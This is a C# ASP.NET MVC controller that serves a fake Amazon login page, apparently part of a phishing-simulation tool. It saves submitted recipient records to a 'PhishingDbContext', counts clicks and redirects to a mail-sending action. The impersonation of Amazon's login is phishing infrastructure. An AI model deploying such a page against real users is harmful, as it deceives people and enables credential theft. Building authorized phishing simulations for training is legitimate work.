using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using WebApplicationMVC2.Models;

namespace WebApplicationMVC2.Controllers
{
    public class AmazonLoginController : Controller
    {
        PhishingDbContext _context;
        public AmazonLoginController()
        {
            _context = new PhishingDbContext();
        }

        // GET: User/Create
        public ActionResult AmazonLogin()
        {
            return View();
        }

        // POST: User/Create
        [HttpPost]
        public ActionResult AmazonLogin(Recipient recipientModel)
        {
            if (ModelState.IsValid)
            {
                var existingUser = _context.Recipients.FirstOrDefault(r => r.Id == recipientModel.Id);
                if (existingUser != null)
                {
                    existingUser.TotalClicks++;
                    existingUser.EnterDate = DateTime.Now;
                    _context.SaveChanges();
                    return RedirectToAction("SendMail", "Home"); 
                }

                recipientModel.EnterDate = DateTime.Now;
                _context.Recipients.Add(recipientModel);
                _context.SaveChanges();
                return RedirectToAction("SendMail", "Home");
            }

            return View(recipientModel);
        }
    }
}